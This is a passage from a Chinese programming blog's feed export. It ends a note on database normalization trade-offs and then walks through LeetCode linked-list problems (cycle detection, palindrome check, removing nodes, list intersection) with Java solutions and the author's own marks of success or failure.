id="优缺点">优缺点</span></h3><p>规范化的优点是明显的，它避免了大量的数据冗余，节省了存储空间，保持了数据的一致性。当一个库里的数据经常发生变化时，达到3NF的库可以使用户不必在超过两个以上的地方更改同一个值。那么是不是只要把所有的表都规范为3NF后，数据库的设计就是最优的呢?这可不一定。范式越高意味着表的划分更细，一个数据库中需要的表也就越多，用户不得不将原本相关联的数据分摊到多个表中。当用户同时需要这些数据时只能采用连接表的形式将数据重新合并在一起。同时把多个表联接在一起的花费是巨大的，尤其是当需要连接的两张或者多张表数据非常庞大的时候，表连接操作几乎是一个噩梦，这严重地降低了系统运行性能</p><h2><span id="数据库连接">数据库连接</span></h2><p><img src="clip_image017.jpg" alt="数据库连接"></p><p><a href="https://blog.csdn.net/DarkAngel1228/article/details/80004222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1" target="_blank" rel="noopener">https://blog.csdn.net/DarkAngel1228/article/details/80004222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1</a> 主从</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表精选</title>
      <link href="/2020/03/22/LinkedList/"/>
      <url>/2020/03/22/LinkedList/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘录了一些经典的链表题，一共16题。</p><a id="more"></a><!-- toc --><ul><li><a href="#链表">链表</a></li><li><a href="#快慢指针法">快慢指针法</a><ul><li><a href="#141-linked-list-cycle">141. Linked List Cycle √</a></li><li><a href="#142-linked-list-cycle-ii">142. Linked List Cycle II √</a></li><li><a href="#876-middle-of-the-linked-list">876. Middle of the Linked List √</a></li><li><a href="#234-palindrome-linked-list">234. Palindrome Linked List √</a></li></ul></li><li><a href="#双指针法">双指针法</a><ul><li><a href="#203-remove-linked-list-elements">203. Remove Linked List Elements √</a></li><li><a href="#160-intersection-of-two-linked-lists">160. Intersection of Two Linked Lists √</a></li></ul></li><li><a href="#删除节点">删除节点</a><ul><li><a href="#19-remove-nth-node-from-end-of-list">19. Remove Nth Node From End of List √</a></li><li><a href="#83-remove-duplicates-from-sorted-list">83. Remove Duplicates from Sorted List ×</a></li><li><a href="#82-remove-duplicates-from-sorted-list-ii">82. Remove Duplicates from Sorted List II ×</a></li></ul></li><li><a href="#基础的解法">基础的解法</a><ul><li><a href="#21merge-two-sorted-lists">21.Merge Two Sorted Lists √</a></li><li><a href="#445-add-two-numbers-ii">445. Add Two Numbers II —</a></li><li><a href="#22-链表中倒数第-k-个结点">22. 链表中倒数第 K 个结点 √</a></li></ul></li><li><a href="#翻转链表">翻转链表</a><ul><li><a href="#206-reverse-linked-list">206. Reverse Linked List √</a></li><li><a href="#92-reverse-linked-list-ii">92. Reverse Linked List II √</a></li><li><a href="#25-reverse-nodes-in-k-group">25. Reverse Nodes in k-Group √</a></li></ul></li><li><a href="#进阶解法">进阶解法</a><ul><li><a href="#24-swap-nodes-in-pairs">24. Swap Nodes in Pairs ×</a></li><li><a href="#725-split-linked-list-in-parts">725. Split Linked List in Parts —</a></li><li><a href="#328-odd-even-linked-list">328. Odd Even Linked List ×</a></li><li><a href="#61-rotate-list">61. Rotate List √</a></li><li><a href="#148-sort-list">148. Sort List ×</a></li><li><a href="#138-copy-list-with-random-pointer">138. Copy List with Random Pointer √</a></li></ul></li></ul><!-- tocstop --><h1><span id="链表">链表</span></h1><p>常用方法：</p><ul><li>方法一：先new一个新的链表 dummy 然后使它指向题目中的head节点，这样能省去很多判断条件，使得代码更好写。最后返回 dummy.next 即可。</li><li>方法二： 快慢指针法，快指针一次步进2，慢指针一次步进1。</li><li>方法三：尾插法，可以做出所有反向链表的题目。</li></ul><h1><span id="快慢指针法">快慢指针法</span></h1><h2><span id="141-linked-list-cycle">141. Linked List Cycle √</span></h2><p>给定一个链表，判断链表中是否有环。<br>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: head &#x3D; [3,2,0,-4], pos &#x3D; 1</span><br><span class="line">Output: true</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the second node.</span><br></pre></td></tr></table></figure><p><img src="l1.png" alt="list-1"></p><ul><li>方法一：HashSet<br><br>我们可以使用HashSet的方法实现O（N）时间复杂度，O（N）空间复杂度。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;ListNode&gt; set = <span class="keyword">new</span> HashSet();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">set.add(head);</span><br><span class="line">            ListNode nextN = head.next;</span><br><span class="line">            <span class="keyword">while</span>(nextN!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(set.contains(nextN))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    set.add(nextN);</span><br><span class="line">                nextN=nextN.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>方法二：Floyd龟兔赛跑<br><br>我们跑步的例子来解释，如果两个人同时出发，如果赛道有环，那么快的一方总能追上慢的一方。进一步想，追上时快的一方肯定比慢的一方多跑了几圈，即多跑的路的长度是圈的长度的倍数。基于上面的想法，Floyd用两个指针，一个慢指针（龟）每次前进一步，快指针（兔）指针每次前进两步（两步或多步效果时等价的，只要一个比另一个快就行）。如果两者在链表头以外的某一点相遇（即相等）了，那么说明链表有环，否则，如果（快指针）到达了链表的结尾，那么说明没有环。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>||head.next==<span class="keyword">null</span>)<span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//the initialized condition</span></span><br><span class="line">          ListNode fast = head;</span><br><span class="line">          ListNode slow = head;</span><br><span class="line">            <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                slow=slow.next;</span><br><span class="line">                fast=fast.next.next;</span><br><span class="line">                <span class="keyword">if</span>(slow == fast)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>提问：时间复杂度是多少？</li></ul><h2><span id="142-linked-list-cycle-ii">142. Linked List Cycle II √</span></h2><p>Given a linked list, return the node where the cycle begins. If there is no cycle, return <code>null</code>.</p><p>To represent a cycle in the given linked list, we use an integer <code>pos</code> which represents the position (0-indexed) in the linked list where tail connects to. If <code>pos</code> is <code>-1</code>, then there is no cycle in the linked list.</p><p><strong>Note:</strong> Do not modify the linked list. </p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: head &#x3D; [3,2,0,-4], pos &#x3D; 1</span><br><span class="line">Output: tail connects to node index 1</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the second node.</span><br></pre></td></tr></table></figure><p><img src="image-20200322195454659.png" alt="Floyed龟兔赛跑"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>||head.next==<span class="keyword">null</span>)<span class="keyword">return</span>  <span class="keyword">null</span>;        </span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(head!=fast)&#123;</span><br><span class="line">                head=head.next;</span><br><span class="line">                fast=fast.next;</span><br><span class="line">                <span class="keyword">if</span>(fast==head)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> head;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="876-middle-of-the-linked-list">876. Middle of the Linked List √</span></h2><p>给定一个带有头结点 <code>head</code> 的非空单链表，返回链表的中间结点。</p><p>如果有两个中间结点，则返回第二个中间结点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode slow=head;</span><br><span class="line">    ListNode fast=head;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="234-palindrome-linked-list">234. Palindrome Linked List √</span></h2><p>Given a singly linked list, determine if it is a palindrome.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;2-&gt;1</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><ul><li><p>使用栈的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; s = <span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span> (fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        s.push(slow.val);</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fast!=<span class="keyword">null</span>) slow=slow.next;</span><br><span class="line">    <span class="keyword">return</span> isEqual(s,slow);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(Stack&lt;Integer&gt; s,ListNode head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!s.isEmpty()&amp;&amp;head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.pop()!=head.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>不使用额外空间的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> flag=<span class="keyword">false</span>;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span> (fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fast==<span class="keyword">null</span>) flag=<span class="keyword">true</span>;</span><br><span class="line">    cut(head,slow);</span><br><span class="line">    slow=flag==<span class="keyword">true</span>?slow:slow.next;</span><br><span class="line">    <span class="keyword">return</span> isEqual(head,reverse(slow));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1.val!=l2.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        l1=l1.next;</span><br><span class="line">        l2=l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cut</span><span class="params">(ListNode head, ListNode slow)</span> </span>&#123;</span><br><span class="line">    ListNode root = head;</span><br><span class="line">    <span class="keyword">while</span> (head.next!=slow)&#123;</span><br><span class="line">        head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    head.next=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverse</span><span class="params">(ListNode root)</span></span>&#123;</span><br><span class="line">    ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        ListNode next =root.next;</span><br><span class="line">        root.next=head.next;</span><br><span class="line">        head.next=root;</span><br><span class="line">        root=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1><span id="双指针法">双指针法</span></h1><h2><span id="203-remove-linked-list-elements">203. Remove Linked List Elements √</span></h2><p>Remove all elements from a linked list of integers that have value <strong><em>val\</em></strong>.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input:  1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val &#x3D; 6</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    ListNode p1=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    p1.next=head;</span><br><span class="line">    ListNode p2=<span class="keyword">null</span>;</span><br><span class="line">    ListNode n=p1;</span><br><span class="line">    <span class="keyword">while</span>(p1!=<span class="keyword">null</span>&amp;&amp;p1.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        p2=p1.next;</span><br><span class="line">        <span class="keyword">if</span>(p2.val==val)</span><br><span class="line">            p1.next=p2.next;</span><br><span class="line">        <span class="keyword">else</span> p1=p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="160-intersection-of-two-linked-lists">160. Intersection of Two Linked Lists √</span></h2><p>Write a program to find the node at which the intersection of two singly linked lists begins.</p><p>For example, the following two linked lists:</p><p><a href="https://assets.leetcode.com/uploads/2018/12/13/160_statement.png" target="_blank" rel="noopener"><img src="https://assets.leetcode.com/uploads/2018/12/13/160_statement.png" alt="img"></a></p><p>begin to intersect at node c1.</p><p>假设A的长度为a，B的长度为b，则总长度为a+b。</p><p>假设a=a<sub>1</sub>+c，b=b<sub>1</sub>+c 则a<sub>1</sub>+c+b<sub>1</sub>==b<sub>1</sub>+c+a<sub>1</sub>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:          a1 → a2       d1 → d2</span><br><span class="line">                    ↘  ↗</span><br><span class="line">                      c</span><br><span class="line">                    ↗  ↘</span><br><span class="line">B:    b1 → b2 → b3        e1 → e2</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">    ListNode l1 = headA, l2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (l1 != l2) &#123;</span><br><span class="line">        l1 = (l1 == <span class="keyword">null</span>) ? headB : l1.next;</span><br><span class="line">        l2 = (l2 == <span class="keyword">null</span>) ? headA : l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="删除节点">删除节点</span></h1><h2><span id="19-remove-nth-node-from-end-of-list">19. Remove Nth Node From End of List √</span></h2><p>Given a linked list, remove the <em>n</em>-th node from the end of list and return its head.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n &#x3D; 2.</span><br><span class="line"></span><br><span class="line">After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    dummy.next=head;</span><br><span class="line">    ListNode fast=dummy,slow=dummy;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    slow.next=slow.next.next;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="83-remove-duplicates-from-sorted-list">83. Remove Duplicates from Sorted List ×</span></h2><p>Given a sorted linked list, delete all duplicates such that each element appear only <em>once</em>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;2</span><br><span class="line">Output: 1-&gt;2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;2-&gt;3-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;       </span><br><span class="line">    ListNode q=head;</span><br><span class="line">    <span class="keyword">while</span>(q!=<span class="keyword">null</span>&amp;&amp;q.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(q.val==q.next.val)q.next=q.next.next;</span><br><span class="line">        <span class="keyword">else</span> q=q.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来加了一个dummy，然后判断条件有问题导致前面的重复可以消除而最后连接NULL的重复元素就消除不了。</p><h2><span id="82-remove-duplicates-from-sorted-list-ii">82. Remove Duplicates from Sorted List II ×</span></h2><p>Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only <em>distinct</em> numbers from the original list.</p><p>Return the linked list sorted as well.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5</span><br><span class="line">Output: 1-&gt;2-&gt;5</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;1-&gt;2-&gt;3</span><br><span class="line">Output: 2-&gt;3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode dummy = <span class="keyword">new</span> ListNode(-<span class="number">123</span>==head.val?<span class="number">0</span>:-<span class="number">123</span>);</span><br><span class="line">    ListNode pre = dummy;</span><br><span class="line">    ListNode cur = head;</span><br><span class="line">    ListNode root=dummy;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="keyword">null</span>&amp;&amp;cur.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur.val!=pre.val&amp;&amp;cur.val!=cur.next.val)&#123;</span><br><span class="line">            root.next=cur;</span><br><span class="line">            root=root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=cur;</span><br><span class="line">        cur=cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre.val!=cur.val)&#123;</span><br><span class="line">        root.next=cur;</span><br><span class="line">        root=root.next;</span><br><span class="line">    &#125;</span><br><span class="line">    root.next=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="基础的解法">基础的解法</span></h1><h2><span id="21merge-two-sorted-lists">21.Merge Two Sorted Lists √</span></h2><p>Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two 